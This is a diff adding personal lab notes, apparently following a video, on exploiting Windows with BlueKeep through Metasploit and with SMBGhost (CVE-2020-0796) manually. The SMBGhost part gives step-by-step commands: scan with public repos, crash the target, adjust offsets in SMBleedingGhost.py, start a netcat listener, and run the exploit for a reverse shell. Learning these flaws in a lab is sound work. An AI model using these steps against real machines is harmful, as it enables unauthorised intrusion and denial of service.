@@ -299,3 +299,32 @@ using msfc we can search for "search bluekeep" start exploiting and also check w
 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce (here make sure the target is set to the right version of windows using "set target <target_id>" and to display different targets use "show targets" as it includes even whether the Win7 OS runs in BareMetal/VirtualBox/Hyper-V etc)
 also settings other options and the right payload start exploiting using the cmd 'exploit'
+
+[VIDEO (Windows SMBGhost Manual Exploitation)] WINDOWS 10 x64 1903 19H1 Build 18362.356-2019.09
+NOTE: this exploit works only if port 445 (this port is usually used by SMB) open & windows firewall is turned off as in real world windows PCs when pinged, they normally filter it but one that's used to provide services to a company or elsewhere those ports would be opened, so we're not faking anything in here
+This exploit works for win10 1903 or 1909 (To download these specific version we can use rufus and select download mode and select spec. OS and build number)
+This is a manual exploitation technique since we don't have any modules present in msfc
+-> So to start we can use nessus to SCAN whether target is vulnerable to smbghost exploit else:
+        to get the cve (common vulnerabilities and exposures) id we can search for the exploit name(smbghost) in the web
+        after finding the cve id we need a scanner that can check whether the target is vulnerable to smbghost
+        search for any related smbghost scanner present in github or else where(The link we got: https://github.com/dickens88/cve-2020-0796-scanner)
+        to execute the above scanner we download, do as follows:
+        > cd <repo_location>
+        > python3 cve-2020-0796-scanner.py -t <target_ip> (scan result shows whether target is vulnerable to it/not)
+-> now we'll try to CRASH the target's machine, so we do the same by searching online and we come up with the following repo: (https://github.com/maxpl0it/Unauthenticated-CVE-2020-0796-PoC [The repo cloned in the video: https://github.com/jiansiting/CVE-2020-0796])
+        to execute the above cloned script, do as follows:
+        > cd <repo_location>
+        > python3 crash.py <target_ip> (result should crash the target win10 PC)
+        (In video the following is used "python3 cve-2020-0796.py <target_ip>")
+-> now to EXPLOIT the target we again search for an exploit online (https://github.com/ZecOps/CVE-2020-0796-RCE-POC)
+this repo consists of a .bat file that should be executed in target win10 machine(for reason check out the README.md file in the repo)
+now on executing the .bat file we get the offset result for the current win10 version that's running in the target machine
+we can now compare that with the offset that's present in the file named "SMBleedingGhost.py"
+if any of the 5 offsets are different we can change that similar to the target's offset in the script file(SMBleedingGhost.py)
+in your case the 4th and 5th offset are different so we set it similar to the target's offset
+as after exploiting the target's should connect to our listener so we need to open a port in the attacker's machine(basically we're creating a reverse shell)
+in order to do it we need netcat and we create it as follows:
+> nc -lvp 4444 (attacker listening in port 4444)
+then the exploit(SMBleedingGhost.py) has to be executed from a windows OS and then redirect the connection to the attacker's kali linux machine to pop a shell as follows:
+> python3 SMBleedingGhost.py <target_ip> <listening_attacker_ip> <listener's_port_no.> (also the listening_attacker's PC could also be the windows machine but make sure netcat is installed to create a listening port)
+(this exploit might crash target's win10 pc but trying eventually will work out)
